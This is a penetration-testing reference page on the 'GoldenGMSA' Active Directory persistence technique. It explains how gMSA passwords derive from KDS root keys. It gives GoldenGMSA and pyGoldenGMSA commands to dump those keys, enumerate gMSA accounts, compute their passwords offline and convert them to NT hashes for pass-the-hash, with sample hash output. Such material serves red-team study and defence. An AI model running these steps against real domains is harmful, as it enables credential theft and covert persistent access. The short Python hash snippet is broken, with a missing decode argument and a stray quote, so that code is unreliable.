---
authors: 4ndr3w6, ShutdownRepo, sckdev, felixbillieres
category: ad
---

# GoldenGMSA

## Theory

### What is a gMSA account?

Within an Active Directory environment, service accounts are often created and used by different applications. These accounts usually have a password that is rarely updated. To address this issue, it is possible to create Group Managed Service Accounts (gMSA), which are managed directly by AD, with a strong password and a regular password rotation.

The password of a gMSA account can legitimately be requested by authorized applications. In that case, an LDAP request is made to the domain controller, asking for the gMSA account's `msDS-ManagedPassword` attribute's value.

> [!TIP]
> A gMSA account's `msDS-ManagedPassword` attribute doesn't actually store the password (it's a [constructed attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a3aff238-5f0e-4eec-8598-0a59c30ecd56)). Everytime that attribute is requested by an authorized principal, the domain controller computes it and returns the result. The calculation is detailed a bit more in the [password calculation](goldengmsa.md#password-calculation) part of this recipe, but simply said, it relies on a static master key (i.e. one of the KDS root keys) and some additional data relative to the gMSA account.

The "GoldenGMSA" persistence lies in the fact that the KDS root keys used for gMSA password calculation don't change (at least not without some admin intervention or custom automation). Once they are exfiltrated and saved, any gMSA account password can be calculated since the additional values needed can be obtained by any low-privileged user.

## Practice

### Obtaining persistence

Once an AD environment is compromised, acquiring the "GoldenGMSA" persistence requires to dump the KDS root keys.

::: tabs

=== Windows

The KDS (Key Distribution Service) root keys can be exfiltrated from the domain with high-privileged access with [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#).

Without the `--forest` argument, the forest root domain is queried, hence requiring Enterprise Admins or Domain Admins privileges in the forest root domain, or SYSTEM privileges on a forest root Domain Controller.

```powershell
GoldenGMSA.exe kdsinfo
```

With the `--forest` argument specifying the target domain or forest, SYSTEM privileges are required on the corresponding domain or forest Domain Controller. In case a child domain is specified, the parent domain keys will be dumped as well.


```powershell
GoldenGMSA.exe kdsinfo --forest child.lab.local
```



=== UNIX-like

[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) (Python) implements the cryptographic pipeline in Python, enabling KDS root key extraction and gMSA password computation from Linux-based platforms without Windows-specific dependencies.

KDS root keys can be exfiltrated with high-privileged access. Multiple authentication methods are supported:

```bash
# Password authentication
python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP kdsinfo

# Pass-the-Hash authentication
python3 main.py -u '$USER' -d $DOMAIN --dc-ip $DC_IP --nt-hash $NT_HASH kdsinfo

# Pass-the-Ticket (Kerberos) authentication
python3 main.py -u '$USER' -d $DOMAIN --dc-ip $DC_IP --ccache admin.ccache kdsinfo
```

The dumped KDS root keys are printed in base64, and can be used for password calculation later on.

:::


### Retrieving gMSA passwords

Later on, the attacker can then, with low-privileged access to the domain:

1. [dump some information relative to the gMSA account](goldengmsa.md#account-information-dump) to retrieve the password for
2. use those elements to [calculate the gMSA password](goldengmsa.md#password-calculation)

#### Account information dump

::: tabs

=== Windows

In addition to the KDS root keys, the following information, relative to a gMSA, need to be dumped in order to compute its password:

* SID (Security IDentifier)
* RootKeyGuid: indicating what KDS root key to use
* Password ID: which rotates regularly

The information can be dumped with low-privilege access to AD with [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#).

```powershell
GoldenGMSA.exe gmsainfo
```

In order to dump the necessary information of a single gMSA, its SID can be used as filter with the `--sid` argument.

```powershell
GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
```


=== UNIX-like

[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) can enumerate gMSA accounts and extract the required information (SID, RootKeyGuid, Password ID, and L0/L1/L2 indices) with low-privilege access:

```bash
# Enumerate all gMSA accounts
python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP gmsainfo

# Enumerate a specific gMSA by SID
python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP gmsainfo --sid "$GMSA_SID"
```

The tool outputs the account name, SID, root key GUID, and indices required for password computation.

:::


#### Password calculation

::: tabs

=== Windows

Given a gMSA SID, the corresponding KDS root key (matching the RootKeyGuid obtained beforehand), and the Password ID, the actual plaintext password can be calculated with [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#).


```powershell
GoldenGMSA.exe compute --sid "S-1-5-21-[...]1586295871-1112" --kdskey "AQA[...]jG2/M=" --pwdid "AQAAAEtEU[...]gBsAGEAYgBzAAAA"
```


Since the password is randomly generated and is not intended to be used by real users with a keyboard (but instead by servers, programs, scripts, etc.) the password is very long, complex and can include non-printable characters. [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) will output the password in base64.

In order to use the password, its MD4 (i.e. NT) hash can be calculated, for [pass the hash](../movement/ntlm/pth.md).


```python
import base64
import hashlib

b64 = input("Password Base64: ")

print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())'
```



=== UNIX-like

[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) can compute gMSA passwords either online (requiring network access to the DC) or offline (using previously dumped KDS root keys), making it particularly useful for persistence scenarios where the attacker may not have continuous access to the domain.

**Online computation** (automatically retrieves KDS root key and password ID from the DC):

```bash
python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP \
    compute --sid $GMSA_SID
```

**Offline computation** (no network access required, using previously dumped KDS root key and password ID):

```bash
python3 main.py compute \
    --sid $GMSA_SID \
    --kdskey 'AQAAAOlMCM5U37Qv...<base64>...' \
    --pwdid 'AQAAAEtEU0sC...<base64>...'
```

Unlike the Windows tool, pyGoldenGMSA outputs the NTLM hash directly in both NT-only format and nxc format, eliminating the need for manual hash conversion:

```
NTLM Hash (NT only):     1c368c74ef1bcbd4892c95a8d6de0f30
NTLM Hash (nxc format):  aad3b435b51404eeaad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30
```

:::


> [!TIP]
> Both [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#) and [pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) (Python) tools featured in this recipe can retrieve gMSA password without the `--kdskey` or `--pwdid` arguments, by requesting those information. If the `--kdskey` is not supplied, high-privilege access will be needed by the tool, which is outside the scope of the GoldenGMSA technique explained in this recipe.

## Resources

[https://github.com/Semperis/GoldenGMSA](https://github.com/Semperis/GoldenGMSA)

[https://github.com/felixbillieres/pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA)

[https://www.semperis.com/blog/golden-gmsa-attack](https://www.semperis.com/blog/golden-gmsa-attack)

[https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks/](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks/)